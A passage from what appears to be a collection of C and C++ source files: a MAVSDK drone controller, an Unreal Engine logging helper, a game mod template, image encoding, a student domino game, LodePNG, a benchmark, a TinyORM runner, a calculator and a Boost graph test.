buffer, QWORD length)\n{\n\treturn rt_write(driver_handle, address, buffer, length);\n}\n",
    "#include \"mavsdk_interface.h\"\n#include <cstdint>\n#include <mavsdk/mavsdk.h>\n#include <mavsdk/plugins/mavlink_passthrough/mavlink_passthrough.h>\n#include <iostream>\n#include <thread>\n#include <chrono>\n\nusing namespace std::this_thread;\nusing namespace std::chrono;\n\nLinkAutopilotInterface::LinkAutopilotInterface()     {\n}\n\nLinkAutopilotInterface::~LinkAutopilotInterface() {\n}\n\nbool LinkAutopilotInterface::connect(std::string connection_url) {\n    \n    mavsdk::Mavsdk mavsdk{mavsdk::Mavsdk::Configuration{mavsdk::Mavsdk::ComponentType::GroundStation}};\n    ConnectionResult connection_result = mavsdk.add_any_connection(connection_url);\n\n    if (connection_result != ConnectionResult::Success) {\n        std::cerr << \"Failed to connect: \" << ConnectionResult(connection_result) << std::endl;\n        return false;\n    }\n\n    auto system = mavsdk.first_autopilot(3.0);\n    if (!system) {\n        std::cerr << \"Timed out waiting for system\\n\";\n        return 1;\n    }\n\n    telemetry = new Telemetry{system.value()};\n    action = new Action{system.value()};\n\n    // \u041e\u0436\u0438\u0434\u0430\u0435\u043c \u0433\u043e\u0442\u043e\u0432\u043d\u043e\u0441\u0442\u0438 \u0434\u0440\u043e\u043d\u0430\n    while (!telemetry->health_all_ok()) {\n        std::cout << \"Waiting for drone to be ready...\" << std::endl;\n        sleep_for(seconds(1));\n    }\n\n    std::cout << \"Drone is ready!\" << std::endl;\n    return true;\n}\n\nvoid LinkAutopilotInterface::setModeGuidedNoGPS() {\n    // \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c MAVLink \u0434\u043b\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b SET_MODE\n    mavsdk::MavlinkPassthrough mavlink_passthrough{system};\n    mavlink_message_t message;\n    uint8_t base_mode = MAV_MODE_FLAG_CUSTOM_MODE_ENABLED;\n    uint32_t custom_mode = 4; // GUIDED_NO_GPS \u0434\u043b\u044f ArduPilot\n\n    mavlink_msg_set_mode_pack(255, 0, &message, system->get_system_id(), base_mode, custom_mode);\n    mavlink_passthrough.send_message(message);\n\n    std::cout << \"Switched to GUIDED_NO_GPS mode\" << std::endl;\n}\n\nvoid LinkAutopilotInterface::armThrottle() {\n    Action::Result arm_result = action->arm();\n    if (arm_result != Action::Result::Success) {\n        std::cerr << \"Arm failed: \" << arm_result << std::endl;\n    } else {\n        std::cout << \"Drone armed\" << std::endl;\n    }\n}\n\nvoid LinkAutopilotInterface::takeoff(float altitude) {\n    Action::Result takeoff_result = action->takeoff();\n    if (takeoff_result != Action::Result::Success) {\n        std::cerr << \"Takeoff failed: \" << takeoff_result << std::endl;\n    } else {\n        std::cout << \"Taking off to altitude: \" << altitude << \" meters\" << std::endl;\n    }\n\n    // \u0416\u0434\u0435\u043c, \u043f\u043e\u043a\u0430 \u0434\u0440\u043e\u043d \u043d\u0435 \u0434\u043e\u0441\u0442\u0438\u0433\u043d\u0435\u0442 \u0436\u0435\u043b\u0430\u0435\u043c\u043e\u0439 \u0432\u044b\u0441\u043e\u0442\u044b\n    sleep_for(seconds(10));\n}\n\n/*void LinkAutopilotInterface::sendMAVLinkCommand(uint16_t command, float param1, float param2, float param3, float param4, float param5, float param6, float param7) {\n    mavsdk::MavlinkPassthrough mavlink_passthrough{system};\n    mavlink_message_t message;\n\n    mavlink_msg_command_long_pack(\n        255, 0, &message, system->get_system_id(), system->get_component_id(),\n        command, 0, param1, param2, param3, param4, param5, param6, param7);\n\n    mavlink_passthrough.send_message(message);\n}*/\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\r\n#include \"PrintStrAdvanced.h\"\r\n#include \"Engine/Engine.h\"\r\n#include \"Kismet/KismetSystemLibrary.h\"\r\n\r\n//Message holder so we dont spam it\r\nstatic FString LastLoggedMessage = TEXT(\"\");\r\nvoid UPrintStrAdvanced::PrintStringAdvanced(AActor* Actor, const FString& Text, EStrColor color, bool FromActor, bool PrintToLogs, bool\r\n                                            PrintToScreen, float TimeToDisplay, FName Key)\r\n{\r\n#if !UE_BUILD_SHIPPING\r\n    //Check if the key is -1 and generate random numbers then, to have unique keys\r\n    if (Key.IsNone() or Key == \"-1\")\r\n    {\r\n        // Generate a random FName\r\n        Key = FName(*FString::Printf(TEXT(\"%d\"), FMath::Rand()));\r\n    }\r\n\r\n    //Pre defines\r\n    FColor col;\r\n    FString finalString;\r\n\r\n    //Reserve 50 chars\r\n    finalString.Reserve(50);\r\n\r\n    switch (color)\r\n    {\r\n    case EStrColor::Blue:\r\n        col = FColor::Blue;\r\n        finalString.Append(TEXT(\"[Information] \"));\r\n        break;\r\n\r\n    case EStrColor::Green:\r\n        col = FColor::Green;\r\n        finalString.Append(TEXT(\"[Success] \"));\r\n        break;\r\n\r\n    case EStrColor::Red:\r\n        col = FColor::Red;\r\n        finalString.Append(TEXT(\"[Failure] \"));\r\n        break;\r\n\r\n    case EStrColor::Yellow:\r\n        col = FColor::Yellow;\r\n        finalString.Append(TEXT(\"[ProgressInfo] \"));\r\n        break;\r\n\r\n    default:\r\n        col = FColor::White;\r\n        break;\r\n    }\r\n\r\n    if (FromActor)\r\n    {\r\n        AActor* MyActor = Cast<AActor>(Actor);\r\n        if (Actor)\r\n        {\r\n            //Add the BP name\r\n            finalString.Append(TEXT(\"[\")).Append(MyActor->GetClass()->GetFName().ToString()).Append(TEXT(\"] : \"));\r\n            //finalString.Append(TEXT(\"[\")).Append(MyActor->GetFName().ToString()).Append(TEXT(\"] : \r\n        }\r\n    }\r\n\r\n    //Add final text to the end\r\n    finalString.Append(Text);\r\n\r\n    // Add the message on screen\r\n    if (GEngine != nullptr && PrintToScreen == true)\r\n    {\r\n        GEngine->AddOnScreenDebugMessage(FCString::Atoi(*Key.ToString()), TimeToDisplay, col, finalString);\r\n    }\r\n\r\n    // Log only if PrintToLogs is true and the message is new\r\n    if (PrintToLogs && finalString != LastLoggedMessage)\r\n    {\r\n        //Another switch for the LOG\r\n        switch (color)\r\n        {\r\n        case EStrColor::Blue:\r\n            UE_LOG(LogTemp, Type::Display, TEXT(\"%s\"), *finalString);\r\n            break;\r\n\r\n        case EStrColor::Green:\r\n            UE_LOG(LogTemp, Type::All, TEXT(\"%s\"), *finalString);\r\n            break;\r\n\r\n        case EStrColor::Red:\r\n            UE_LOG(LogTemp, Type::Error, TEXT(\"%s\"), *finalString);\r\n            break;\r\n\r\n        case EStrColor::Yellow:\r\n            UE_LOG(LogTemp, Type::Log, TEXT(\"%s\"), *finalString);\r\n            break;\r\n\r\n        default:\r\n\r\n            break;\r\n        }\r\n\r\n        //Set the last logged message\r\n        LastLoggedMessage = finalString;\r\n    }\r\n#endif\r\n}",
    "//#define DEBUG_CONSOLE // Uncomment this if you want a debug console to start. You can use the Console class to print. You can use Console::inStrings to get input.\n\n#include <4dm.h>\n\nusing namespace fdm;\n\n// Initialize the DLLMain\ninitDLL\n\n$hook(void, StateGame, init, StateManager& s)\n{\n\t// Your code that runs at first frame here (it calls when you load into the world)\n\n\toriginal(self, s);\n}\n\n$hook(void, Player, update, World* world, double dt, EntityPlayer* entityPlayer)\n{\n\t// Your code that runs every frame here (it only calls when you play in world, because its Player's function)\n\n\toriginal(self, world, dt, entityPlayer);\n}\n\n$hook(bool, Player, keyInput, GLFWwindow* window, World* world, int key, int scancode, int action, int mods)\n{\n\t// Your code that runs when Key Input happens (check GLFW Keyboard Input tutorials)|(it only calls when you play in world, because its Player's function)\n\n\treturn original(self, window, world, key, scancode, action, mods);\n}\n\n$hook(void, StateIntro, init, StateManager& s)\n{\n\toriginal(self, s);\n\n\t// initialize opengl stuff\n\tglewExperimental = true;\n\tglewInit();\n\tglfwInit();\n}",
    "#include <stdexcept>\n\n#include \"image-encoder.h\"\n\nextern \"C\" {\n#include \"image-encoder-png.h\"\n#include \"image-encoder-jpeg.h\"\n}\n\nImageEncoder::ImageEncoder(Type encoder_type) : m_type(encoder_type) {}\n\nvoid ImageEncoder::encodeImage(const uint8_t* rgb_buffer, int32_t width, int32_t height, int32_t number_of_channels, const std::string& filepath) const {\n    switch (m_type)\n    {\n    case Type::PNG:\n        if (! encodeImageToPNG(rgb_buffer, width, height, number_of_channels, filepath.c_str())) {\n            throw std::runtime_error(std::string(\"PNG: Failed to encode image at \") + filepath);\n        }\n        break;\n    case Type::JPEG:\n        if (! encodeImageToJPEG(rgb_buffer, width, height, number_of_channels, filepath.c_str())) {\n            throw std::runtime_error(std::string(\"JPEG: Failed to encode image at \") + filepath);\n        }\n        break;\n    }\n}\n\nvoid ImageEncoder::encodeImage(const Image& image, const std::string& filepath) const {\n    encodeImage(image.getBuffer(), image.getWidth(), image.getHeight(), image.getChannels(), filepath);\n}\n",
    "//DOM-RIP - View\r\n//09/08/2023\r\n//Grupo: RIP\r\n//pedro yoshissaro / Isadora Piloto / Rafael Cabral \r\n\r\n\r\n#include \"DOM_RIP_View.h\"\r\n\r\nvoid MostrarPecas(tipoPeca peca[]) //mostra as pecas do tabuleiro\r\n{\r\n    for (int x = 0; x < 28; x++)\r\n    {\r\n        printf(\"[%d|%d]\", peca[x].lado1, peca[x].lado2);\r\n    }\r\n}\r\n\t\t\r\nint ChamarMenu() //menu de uso \r\n{\r\n\tint op;\r\n    printf(\"+--------------------------------------+\\n\");\r\n    printf(\"|             Menu Geral:             |\\n\");\r\n    printf(\"+--------------------------------------+\\n\");\r\n    printf(\"| 1 - iniciar jogo (2 jogadores)      |\\n\");\r\n    printf(\"| 2 - iniciar jogo (1 jogador)        |\\n\");\r\n    printf(\"| 3 - Regras do jogo                  |\\n\");\r\n    printf(\"| 4 - Salvar Jogo                     |\\n\");\r\n    printf(\"| 5 - Continuar Jogo salvo            |\\n\");\r\n    printf(\"| 6 - Sair                            |\\n\");\r\n    printf(\"+--------------------------------------+\\n\");\r\n    printf(\"Escolha uma opcao: \");\r\n\tscanf(\"%d\", &op);\r\n\tLimpaTela();\r\n\tprintf(\"\\n\");\r\n\treturn op;\r\n}\r\n\r\nvoid Pecaj()\r\n{\r\n    int x;\r\n\t\t\r\n\t\tfor(x = 0; x < 27; x++)\r\n\t\t{\r\n\t\t\tif (pecas[x].status == jvez)\r\n        \t{\r\n            \tprintf(\" %d-[%d|%d]\", x, pecas[x].lado1, pecas[x].lado2);\r\n        \t}\r\n\t\t}\r\n        \r\n    \r\n}\r\n\r\nvoid apresentaMesa()\r\n{\r\n\tprintf(\"\\n\\n\");\r\n\tprintf(\"==============================\\n\");\r\n\tfor (int i = 0; i < 100; i++)\r\n\t{\r\n\t\tif (mesa[i].status == MESA)\r\n\t\t{\r\n\t\t\tprintf(\"[%d|%d]\", mesa[i].lado1, mesa[i].lado2);\r\n\t\t\tqtmesa++;\r\n\t\t}\r\n\t}\r\n\tprintf(\"\\n==============================\\n\");\r\n} \r\n\t\r\nvoid Jogadorvez()\r\n{\r\n\tprintf(\"\\n\\n\");\r\n\t\r\n\tif(jvez == '1')\r\n\t\tprintf(\"Mao do jogador 1: \");\r\n\telse\r\n\t\tprintf(\"Mao do jogador 2: \");\r\n\t\r\n}\r\n\r\nchar subMenu()\r\n{\r\n\tint escolha;\r\n\t\r\n\tprintf(\"\\n1 - Jogar\\n\");\r\n\tprintf(\"2 - Comprar\\n\");\r\n\tprintf(\"3 - Passar\\n\");\r\n\tprintf(\"4 - sair (interrompe o jogo)\\n\");\r\n\tprintf(\"Opcao: \");\r\n\tscanf(\"%d\", &escolha);\r\n\tfclear();\r\n\t\t\r\n\treturn escolha;\t\r\n}\r\n\r\nvoid apresentaMensagem(char mens[100])\r\n{\r\n\tprintf(\"%s\\n\",mens);\r\n}\r\n\t\r\nvoid mensagemc()\r\n{\r\n\tprintf(\"Nada para comprar!\");\r\n}\r\n\r\nvoid Regras()\r\n{\r\n\tprintf(\"Regras do jogo domino!\");\r\n\tprintf(\" cada jogador inicia com sete pecas obtidas aleatoriamente e pode 'comprar' quantas vezes for necessario \");\r\n\tprintf(\"jogo inicia-se com o jogador que tiver a peca 'seis-seis'\");\r\n\tprintf(\"os jogadores devem colocar pecas que tenham os mesmos numeros das pecas que se encontram nas 2 pontas do jogo.\");\r\n\tprintf(\"Cada jogador, no seu turno, deve colocar uma das suas pe\u00e7as em uma das 2 extremidades abertas na mesa,\");\r\n\tprintf(\"de forma que os pontos de um dos lados coincidam com os pontos da extremidade onde esta sendo colocada\");\r\n\tprintf(\"\\n\");\r\n\t\r\n}\r\n\r\nvoid msgsaida()\r\n{\r\n\tprintf(\"obrigado por jogar!\");\r\n}\r\n\r\nvoid msgNpode()\r\n{\r\n\tprintf(\"Nao eh possivel passar a jogada\\n\\n\");\r\n}\r\n\r\nvoid msgWin1()\r\n{\r\n\tprintf(\"Jogardor 1 venceu o jogo\\n\\n\");\r\n}\r\n\r\nvoid msgWin2()\r\n{\r\n\tprintf(\"Jogador 2 venceu o jogo\\n\\n\");\r\n}\r\n\r\nvoid msgCompra()\r\n{\r\n\tprintf(\"\\nPassagem bloqueada. O depositivo nao esta vazio. Voce deve jogar e/ou comprar\\n\\n\");\r\n}\r\n\r\nvoid msgEmpate()\r\n{\r\n\tprintf(\"Empate Tecnico\\n\\n\");\r\n}\r\n\r\nvoid msgSair()\r\n{\r\n\tprintf(\"Voltando ao submenu....\");\r\n}\r\n\r\nvoid msgCompras()\r\n{\r\n\tprintf(\"ainda ha pecas para serem compradas\\n\\n\");\r\n}\r\n\r\nvoid msgEx()\r\n{\r\n\tprintf(\"Peca invalida\");\r\n}\r\n\r\nvoid msgEscolha()\r\n{\r\n\tprintf(\"Qual peca vc deseja jogar? \");\r\n}\r\n\r\nvoid falarJvez()\r\n{\r\n\tprintf(\"O primeiro jogador foi %c\", jvez);\r\n}\r\n\r\nvoid msgEscolhaL()\r\n{\r\n\tprintf(\"Vc deseja jogar na direita ou na esquerda? (d/e): \");\r\n}\r\n\r\nvoid msgNpodeJ()\r\n{\r\n\tprintf(\"\\nEssa peca nao pode ser jogada na posicao desejada \\n\");\r\n}",
    "/*\nLodePNG version 20230410\n\nCopyright (c) 2005-2023 Lode Vandevenne\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n    1. The origin of this software must not be misrepresented; you must not\n    claim that you wrote the original software. If you use this software\n    in a product, an acknowledgment in the product documentation would be\n    appreciated but is not required.\n\n    2. Altered source versions must be plainly marked as such, and must not be\n    misrepresented as being the original software.\n\n    3. This notice may not be removed or altered from any source\n    distribution.\n*/\n\n/*\nThe manual and changelog are in the header file \"lodepng.h\"\nRename this file to lodepng.cpp to use it for C++, or to lodepng.c to use it for C.\n*/\n\n#include \"lodepng.h\"\n\n#ifdef LODEPNG_COMPILE_DISK\n#include <limits.h> /* LONG_MAX */\n#include <stdio.h> /* file handling */\n#endif /* LODEPNG_COMPILE_DISK */\n\n#ifdef LODEPNG_COMPILE_ALLOCATORS\n#include <stdlib.h> /* allocations */\n#endif /* LODEPNG_COMPILE_ALLOCATORS */\n\n#if defined(_MSC_VER) && (_MSC_VER >= 1310) /*Visual Studio: A few warning types are not desired here.*/\n#pragma warning( disable : 4244 ) /*implicit conversions: not warned by gcc -Wall -Wextra and requires too much casts*/\n#pragma warning( disable : 4996 ) /*VS does not like fopen, but fopen_s is not standard C so unusable here*/\n#endif /*_MSC_VER */\n\nconst char* LODEPNG_VERSION_STRING = \"20230410\";\n\n/*\nThis source file is divided into the following large parts. The code sections\nwith the \"LODEPNG_COMPILE_\" #defines divide this up further in an intermixed way.\n-Tools for C and common code for PNG and Zlib\n-C Code for Zlib (huffman, deflate, ...)\n-C Code for PNG (file format chunks, adam7, PNG filters, color conversions, ...)\n-The C++ wrapper around all of the above\n*/\n\n/* ////////////////////////////////////////////////////////////////////////// */\n/* ////////////////////////////////////////////////////////////////////////// */\n/* // Tools for C, and common code for PNG and Zlib.                       // */\n/* ////////////////////////////////////////////////////////////////////////// */\n/* ////////////////////////////////////////////////////////////////////////// */\n\n/*The malloc, realloc and free functions defined here with \"lodepng_\" in front\nof the name, so that you can easily change them to others related to your\nplatform if needed. Everything else in the code calls these. Pass\n-DLODEPNG_NO_COMPILE_ALLOCATORS to the compiler, or comment out\n#define LODEPNG_COMPILE_ALLOCATORS in the header, to disable the ones here and\ndefine them in your own project's source files without needing to change\nlodepng source code. Don't forget to remove \"static\" if you copypaste them\nfrom here.*/\n\n#ifdef LODEPNG_COMPILE_ALLOCATORS\nstatic void* lodepng_malloc(size_t size) {\n#ifdef LODEPNG_MAX_ALLOC\n    if (size > LODEPNG_MAX_ALLOC) return 0;\n#endif\n    return malloc(size);\n}\n\n/* NOTE: when realloc returns NULL, it leaves the original memory untouched */\nstatic void* lodepng_realloc(void* ptr, size_t new_size) {\n#ifdef LODEPNG_MAX_ALLOC\n    if (new_size > LODEPNG_MAX_ALLOC) return 0;\n#endif\n    return realloc(ptr, new_size);\n}\n\nstatic void lodepng_free(void* ptr) {\n    free(ptr);\n}\n#else /*LODEPNG_COMPILE_ALLOCATORS*/\n/* TODO: support giving additional void* payload to the custom allocators */\nvoid* lodepng_malloc(size_t size);\nvoid* lodepng_realloc(void* ptr, size_t new_size);\nvoid lodepng_free(void* ptr);\n#endif /*LODEPNG_COMPILE_ALLOCATORS*/\n\n/* convince the compiler to inline a function, for use when this measurably improves performance */\n/* inline is not available in C90, but use it when supported by the compiler */\n#if (defined(__STDC_VERSION__) && (__STDC_VERSION__ >= 199901L)) || (defined(__cplusplus) && (__cplusplus >= 199711L))\n#define LODEPNG_INLINE inline\n#else\n#define LODEPNG_INLINE /* not available */\n#endif\n\n/* restrict is not available in C90, but use it when supported by the compiler */\n#if (defined(__GNUC__) && (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 1))) ||\\\n    (defined(_MSC_VER) && (_MSC_VER >= 1400)) || \\\n    (defined(__WATCOMC__) && (__WATCOMC__ >= 1250) && !defined(__cplusplus))\n#define LODEPNG_RESTRICT __restrict\n#else\n#define LODEPNG_RESTRICT /* not available */\n#endif\n\n/* Replacements for C library functions such as memcpy and strlen, to support platforms\nwhere a full C library is not available. The compiler can recognize them and compile\nto something as fast. */\n\nstatic void lodepng_memcpy(void* LODEPNG_RESTRICT dst,\n    const void* LODEPNG_RESTRICT src, size_t size) {\n    size_t i;\n    for (i = 0; i < size; i++) ((char*)dst)[i] = ((const char*)src)[i];\n}\n\nstatic void lod",
    "#include <vector>\n#include <iterator>\n#include <chrono>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <numeric>\n#include <cmath>\n#include <zle.h>\n\nstd::vector<std::vector<int>> readMatrixFromCSV(const std::string& filename) {\n    std::vector<std::vector<int>> matrix;\n    std::ifstream file(filename);\n    std::string line;\n\n    while (std::getline(file, line)) {\n        std::vector<int> row;\n        std::stringstream ss(line);\n        std::string cell;\n\n        while (std::getline(ss, cell, ',')) {\n            row.push_back(std::stoi(cell));\n        }\n\n        matrix.push_back(row);\n    }\n\n    return matrix;\n}\n\nlong long runBenchmark(const std::vector<std::vector<SymX>>& A, const std::vector<std::string>& s, int batch_size, int stagger, int base) {\n    auto start = std::chrono::high_resolution_clock::now();\n\n    std::vector<std::vector<int>> result = zle_eigs(A, s, batch_size, stagger, base);\n\n    auto end = std::chrono::high_resolution_clock::now();\n\n    return std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <csv_file>\" << std::endl;\n        return 1;\n    }\n\n    std::string csvFilename = argv[1];\n    std::vector<std::vector<int>> indexMatrix = readMatrixFromCSV(csvFilename);\n\n    int n = indexMatrix.size();\n    std::vector<std::string> s = get_symbols(n);\n\n    std::vector<std::vector<SymX>> A(n, std::vector<SymX>(n));\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < n; ++j) {\n            A[i][j] = symx(1, s[indexMatrix[i][j]]);\n        }\n    }\n\n    int batch_size = n;\n    int stagger = 0;\n    int base = 10;\n\n    const int num_runs = 3;\n    std::vector<long long> durations;\n\n    std::cout << \"Running \" << num_runs << \" iterations...\" << std::endl;\n\n    for (int i = 0; i < num_runs; ++i) {\n        long long duration = runBenchmark(A, s, batch_size, stagger, base);\n        durations.push_back(duration);\n        std::cout << \"Run \" << i + 1 << \" finished in \" << duration << \" milliseconds\" << std::endl;\n    }\n\n    // Calculate average\n    long long total_duration = std::accumulate(durations.begin(), durations.end(), 0LL);\n    double average_duration = static_cast<double>(total_duration) / num_runs;\n\n    // Calculate variance\n    double variance = 0.0;\n    for (const auto& duration : durations) {\n        variance += std::pow(duration - average_duration, 2);\n    }\n    variance /= num_runs;\n\n    // Calculate standard deviation\n    double std_deviation = std::sqrt(variance);\n\n    std::cout << \"Matrix size: \" << n << \"x\" << n << std::endl;\n    std::cout << \"Average time over \" << num_runs << \" runs: \" << average_duration << \" milliseconds\" << std::endl;\n    std::cout << \"Variance: \" << variance << \" milliseconds^2\" << std::endl;\n    std::cout << \"Standard Deviation: \" << std_deviation << \" milliseconds\" << std::endl;\n\n    // Log results to a CSV file\n    std::ofstream logFile(\"benchmark_results.csv\", std::ios_base::app); // Open in append mode\n    if (logFile.is_open()) {\n        logFile << n << \",\" << average_duration << \",\" << variance << \",\" << std_deviation << std::endl;\n        logFile.close();\n    } else {\n        std::cerr << \"Unable to open log file for writing.\" << std::endl;\n    }\n\n    return 0;\n}",
    "#include <orm/db.hpp>\n#include <orm/utils/configuration.hpp>\n\n#include <tom/application.hpp>\n\n#include \"migrations/2014_10_12_000000_create_posts_table.hpp\"\n#include \"migrations/2014_10_12_100000_add_factor_column_to_posts_table.hpp\"\n#include \"migrations/2014_10_12_200000_create_properties_table.hpp\"\n#include \"migrations/2014_10_12_300000_create_phones_table.hpp\"\n\n#include \"seeders/databaseseeder.hpp\"\n\nusing Orm::DatabaseManager;\nusing Orm::DB;\n\nusing ConfigUtils = Orm::Utils::Configuration;\n\nusing TomApplication = Tom::Application;\n\nusing namespace Migrations; // NOLINT(google-build-using-namespace)\nusing namespace Seeders;    // NOLINT(google-build-using-namespace)\n\n/*! Create the database manager instance and add a database connection. */\nstatic std::shared_ptr<DatabaseManager> setupDatabaseManager(); // NOLINT(misc-use-anonymous-namespace)\n\n/*! C++ main function. */\nint main(int argc, char *argv[])\n{\n    try {\n        // Ownership of the shared_ptr()\n        auto db = setupDatabaseManager();\n\n        return TomApplication(argc, argv, std::move(db), \"TOM_EXAMPLE_ENV\")\n                .migrations<CreatePostsTable,\n                            AddFactorColumnToPostsTable,\n                            CreatePropertiesTable,\n                            CreatePhonesTable>()\n                .seeders<DatabaseSeeder>()\n                // Fire it up \ud83d\udd25\ud83d\ude80\u2728\n                .run();\n\n    } catch (const std::exception &e) {\n\n        TomApplication::logException(e);\n    }\n\n    return EXIT_FAILURE;\n}\n\nstd::shared_ptr<DatabaseManager> setupDatabaseManager()\n{\n    using namespace Orm::Constants; // NOLINT(google-build-using-namespace)\n\n    // Ownership of the shared_ptr()\n    return DB::create({\n        {driver_,         QMYSQL},\n        {host_,           qEnvironmentVariable(\"DB_MYSQL_HOST\",      H127001)},\n        {port_,           qEnvironmentVariable(\"DB_MYSQL_PORT\",      P3306)},\n        {database_,       qEnvironmentVariable(\"DB_MYSQL_DATABASE\",  EMPTY)},\n        {username_,       qEnvironmentVariable(\"DB_MYSQL_USERNAME\",  EMPTY)},\n        {password_,       qEnvironmentVariable(\"DB_MYSQL_PASSWORD\",  EMPTY)},\n        {charset_,        qEnvironmentVariable(\"DB_MYSQL_CHARSET\",   UTF8MB4)},\n        {collation_,      qEnvironmentVariable(\"DB_MYSQL_COLLATION\", UTF8MB40900aici)},\n        // SYSTEM - set the time zone to your local MySQL server time zone\n        {timezone_,       TZ00},\n        /* Specifies what time zone all QDateTime-s will have, the overridden default\n           is the QTimeZone::UTC, set to the QTimeZone::LocalTime or\n           QtTimeZoneType::DontConvert to use the system local time. */\n        {qt_timezone,     QVariant::fromValue(QTimeZone::UTC)},\n        {prefix_,         EMPTY},\n        {prefix_indexes,  false},\n        {strict_,         true},\n        {isolation_level, u\"REPEATABLE READ\"_s}, // MySQL default is REPEATABLE READ for InnoDB\n        {engine_,         InnoDB},\n        {options_,        ConfigUtils::mysqlSslOptions()},\n    },\n        u\"tinyorm_tom_mysql\"_s); // shell:connection\n}\n",
    "#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nint main() {\n    double num1, num2, result;\n    char operation;\n\n    cout << \"Enter the first number: \";\n    cin >> num1;\n\n    cout << \"Enter the second number: \";\n    cin >> num2;\n\n    cout << \"Choose an operation:\\n\";\n    cout << \"1. Addition (+)\\n\";\n    cout << \"2. Subtraction (-)\\n\";\n    cout << \"3. Multiplication (*)\\n\";\n    cout << \"4. Division (/)\\n\";\n    cout << \"5. Exponentiation (^)\\n\";\n    cout << \"6. Square root (sqrt)\\n\";\n    cout << \"Enter your choice: \";\n    cin >> operation;\n\n    switch (operation) {\n        case '+':\n            result = num1 + num2;\n            break;\n        case '-':\n            result = num1 - num2;\n            break;\n        case '*':\n            result = num1 * num2;\n            break;\n        case '/':\n            if (num2 == 0) {\n                cout << \"Error: Division by zero is not allowed.\" << endl;\n                return 1; // Exit with an error code\n            }\n            result = num1 / num2;\n            break;\n        case '^':\n            result = pow(num1, num2);\n            break;\n        case 's': // For square root, use 's' as a shortcut\n            result = sqrt(num1);\n            break;\n        default:\n            cout << \"Invalid operation.\" << endl;\n            return 1; // Exit with an error code\n    }\n\n    cout << \"Result: \" << result << endl;\n\n    return 0;\n}\n",
    "// Copyright 2004 The Trustees of Indiana University.\n\n// Use, modification and distribution is subject to the Boost Software\n// License, Version 1.0. (See accompanying file LICENSE_1_0.txt or copy at\n// http://www.boost.org/LICENSE_1_0.txt)\n\n//  Authors: Nick Edmonds\n//           Andrew Lumsdaine\n\n#include <boost/graph/use_mpi.hpp>\n\n#define CSR\n\n#ifdef CSR\n#  include <boost/graph/distributed/compressed_sparse_row_graph.hpp>\n#else\n#  include <boost/graph/distributed/adjacency_list.hpp>\n#endif\n\n#include <boost/core/lightweight_test.hpp>\n#include <boost/graph/distributed/mpi_process_group.hpp>\n#include <boost/graph/distributed/queue.hpp>\n\n#include <boost/graph/parallel/distribution.hpp>\n#include <boost/lexical_cast.hpp>\n#include <boost/bind.hpp>\n#include <sys/time.h>\n#include <time.h>\n\n#include <boost/random.hpp>\n#include <boost/property_map/parallel/distributed_property_map.hpp>\n\n#include <boost/random/linear_congruential.hpp>\n\n#include <boost/graph/distributed/graphviz.hpp>\n#include <boost/graph/graph_traits.hpp>\n#include <boost/graph/iteration_macros.hpp>\n\n#include <boost/graph/parallel/algorithm.hpp>\n#include <boost/graph/breadth_first_search.hpp>\n#include <boost/pending/queue.hpp>\n\n#include <boost/graph/rmat_graph_generator.hpp>\n#include <boost/graph/distributed/betweenness_centrality.hpp>\n#include <boost/graph/distributed/filtered_graph.hpp>\n#include <boost/graph/parallel/container_traits.hpp>\n\n#include <boost/graph/properties.hpp>\n\n#include <algorithm>\n#include <vector>\n#include <string>\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <stdint.h>\n\nusing namespace boost;\n\n// #define DEBUG\n\ntypedef rand48 RandomGenerator;\n\n/****************************************************************************\n * Timing\n ****************************************************************************/\n#ifndef PBGL_ACCOUNTING \n\ntypedef double time_type;\n\ninline time_type get_time()\n{\n  timeval tp;\n  gettimeofday(&tp, 0);\n  return tp.tv_sec + tp.tv_usec / 1000000.0;\n}\n\nstd::string print_time(time_type t)\n{\n  std::ostringstream out;\n  out << std::setiosflags(std::ios::fixed) << std::setprecision(2) << t;\n  return out.str();\n}\n\n#endif // PBGL_ACCOUNTING\n\n/****************************************************************************\n * Edge weight generator iterator                                           *\n ****************************************************************************/\ntemplate<typename F, typename RandomGenerator>\nclass generator_iterator\n{\npublic:\n  typedef std::input_iterator_tag iterator_category;\n  typedef typename F::result_type value_type;\n  typedef const value_type&       reference;\n  typedef const value_type*       pointer;\n  typedef void                    difference_type;\n\n  explicit \n  generator_iterator(RandomGenerator& gen, const F& f = F()) \n    : f(f), gen(&gen) \n  { \n    value = this->f(gen); \n  }\n\n  reference operator*() const  { return value; }\n  pointer   operator->() const { return &value; }\n\n  generator_iterator& operator++()\n  {\n    value = f(*gen);\n    return *this;\n  }\n\n  generator_iterator operator++(int)\n  {\n    generator_iterator temp(*this);\n    ++(*this);\n    return temp;\n  }\n\n  bool operator==(const generator_iterator& other) const\n  { return f == other.f; }\n\n  bool operator!=(const generator_iterator& other) const\n  { return !(*this == other); }\n\nprivate:\n  F f;\n  RandomGenerator* gen;\n  value_type value;\n};\n\ntemplate<typename F, typename RandomGenerator>\ninline generator_iterator<F, RandomGenerator> \nmake_generator_iterator( RandomGenerator& gen, const F& f)\n{ return generator_iterator<F, RandomGenerator>(gen, f); }\n\ntemplate<typename Graph, typename DistanceMap, typename WeightMap, typename ColorMap>\nstruct ssca_visitor : bfs_visitor<> \n{\n  typedef typename property_traits<WeightMap>::value_type Weight;\n  typedef typename property_traits<ColorMap>::value_type ColorValue;\n  typedef color_traits<ColorValue> Color;\n\n  ssca_visitor(DistanceMap& distance, const WeightMap& weight, ColorMap& color,\n               Weight max_)\n    : distance(distance), weight(weight), color(color), max_(max_) {}\n\n  template<typename Edge>\n  void tree_edge(Edge e, const Graph& g)\n  {\n    int new_distance = get(weight, e) == (std::numeric_limits<Weight>::max)() ? \n      